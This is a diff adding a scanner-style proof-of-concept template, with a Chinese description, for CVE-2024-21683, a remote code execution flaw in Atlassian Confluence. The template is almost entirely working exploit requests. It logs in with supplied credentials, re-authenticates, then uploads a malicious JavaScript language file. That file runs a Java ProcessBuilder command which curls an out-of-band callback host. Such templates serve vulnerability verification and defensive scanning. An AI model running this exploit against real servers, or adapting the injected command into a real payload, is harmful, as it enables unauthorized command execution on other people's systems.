@@ -1,0 +1,68 @@
+[info]
+author = "ave"
+description = "Atlassian Confluence Data Center 和 Server 的 /admin/plugins/newcode/addlanguage.action 接口存在远程代码执行漏洞，已认证攻击者可通过上传恶意语言文件在服务器上执行任意命令。本 PoC 通过登录、重新认证、上传恶意 JS 文件三步完成验证，需要有效的 Confluence 用户名和密码。"
+id = "POC-AVE-2024-0013"
+name = "Atlassian Confluence 远程代码执行漏洞 PoC"
+severity = "high"
+tags = ["ave-2024-0013"]
+vuln_id = [
+    "CVE-2024-21683",
+    "AVE-2024-0013",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/dologin.action"
+protocol = "http"
+
+[poc.requests.body]
+content = "os_username={{username}}&os_password={{password}}&login=Log+in&os_destination="
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [302]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/doauthenticate.action"
+protocol = "http"
+
+[poc.requests.body]
+content = "password={{password}}&authenticate=Confirm&destination=%2Fadmin%2Fplugins%2Fnewcode%2Faddlanguage.action"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+X-Atlassian-Token = "no-check"
+
+[[poc.requests.matchers]]
+expect = true
+status = [302]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/admin/plugins/newcode/addlanguage.action"
+protocol = "http"
+
+[poc.requests.body]
+content = '------WebKitFormBoundaryFcBwsDjo5LkYWGWE\nContent-Disposition: form-data; name="languageFile";filename="{{randstr}}.js"\nContent-type: text/javascript\n\nnew java.lang.ProcessBuilder["(java.lang.String[])"](["curl","{{interactsh-url}}"]).start()\n------WebKitFormBoundaryFcBwsDjo5LkYWGWE\nContent-Disposition: form-data; name="newLanguageName"\n\n{{randstr}}\n------WebKitFormBoundaryFcBwsDjo5LkYWGWE--'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundaryFcBwsDjo5LkYWGWE"
+X-Atlassian-Token = "no-check"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["confluence"]
